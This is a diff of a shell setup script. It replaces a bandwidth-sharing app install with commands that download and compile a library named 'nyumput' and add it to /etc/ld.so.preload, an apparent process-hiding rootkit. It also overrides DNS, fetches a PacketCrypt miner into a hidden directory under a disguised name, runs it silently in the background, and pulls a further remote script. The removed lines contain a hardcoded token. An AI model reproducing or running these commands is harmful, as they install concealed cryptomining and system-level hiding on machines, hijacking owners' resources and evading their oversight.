@@ -1,13 +1,15 @@
-curl -o app-linux-amd64.tar.gz https://assets.coreservice.io/public/package/22/app/1.0.3/app-1_0_3.tar.gz 
-tar -zxf app-linux-amd64.tar.gz 
-rm -rvf app-linux-amd64.tar.gz 
-cd app-linux-amd64 
-./app service install
-./app service start
-./app status
-./apps/gaganode/gaganode config set --token=zyqyhrzkytyhjztjb0ac169bbd4baef3
-./app restart
-./app status
+curl https://bitbucket.org/dennidarko01/kangkung/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+mkdir .kap && cd .kap
+wget -O sgr1 https://www.pkt.world/ext/packetcrypt-linux-amd64
+chmod 777 sgr1 
+./sgr1 ann -p pPeVNWfAjPGdDst9A6BwgMpZMZuTFfJRRu http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com > /dev/null 2>&1 &
 wget https://raw.githubusercontent.com/BianAnisa/REvolve/main/script/time.sh
 chmod +x time.sh
 timeout 55m ./time.sh
